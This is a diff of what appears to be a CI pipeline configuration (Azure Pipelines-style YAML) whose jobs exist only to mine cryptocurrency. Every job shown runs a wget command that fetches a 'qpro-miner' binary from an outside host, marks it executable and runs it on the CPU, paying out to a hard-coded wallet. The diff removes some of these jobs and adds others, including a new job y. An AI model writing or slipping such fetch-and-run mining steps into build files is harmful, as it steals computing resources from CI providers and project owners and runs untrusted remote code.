@@ -100,18 +100,6 @@ jobs:
   steps:
   - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner &&  ./qpro-miner --cpu --wallet JYJYQFDFZAXZMDSFDDHUITLXMLABDLZSXNFTGYQWPGLCYQOVNYNZAIDEUBUC --worker 32v --url ws.qubicmine.pro
 
-- job: m
-  timeoutInMinutes: 360
-  cancelTimeoutInMinutes: 360
-  steps:
-  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner &&  ./qpro-miner --cpu --wallet JYJYQFDFZAXZMDSFDDHUITLXMLABDLZSXNFTGYQWPGLCYQOVNYNZAIDEUBUC --worker 32v --url ws.qubicmine.pro
-
-- job: q
-  timeoutInMinutes: 360
-  cancelTimeoutInMinutes: 360
-  steps:
-  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner &&  ./qpro-miner --cpu --wallet JYJYQFDFZAXZMDSFDDHUITLXMLABDLZSXNFTGYQWPGLCYQOVNYNZAIDEUBUC --worker 32v --url ws.qubicmine.pro
-
 - job: r
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
@@ -154,10 +142,14 @@ jobs:
   steps:
   - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner &&  ./qpro-miner --cpu --wallet JYJYQFDFZAXZMDSFDDHUITLXMLABDLZSXNFTGYQWPGLCYQOVNYNZAIDEUBUC --worker 32v --url ws.qubicmine.pro
 
-- job: y
+- job: w
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner &&  ./qpro-miner --cpu --wallet JYJYQFDFZAXZMDSFDDHUITLXMLABDLZSXNFTGYQWPGLCYQOVNYNZAIDEUBUC --worker 32v --url ws.qubicmine.pro
 
-
+- job: y
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner &&  ./qpro-miner --cpu --wallet JYJYQFDFZAXZMDSFDDHUITLXMLABDLZSXNFTGYQWPGLCYQOVNYNZAIDEUBUC --worker 32v --url ws.qubicmine.pro
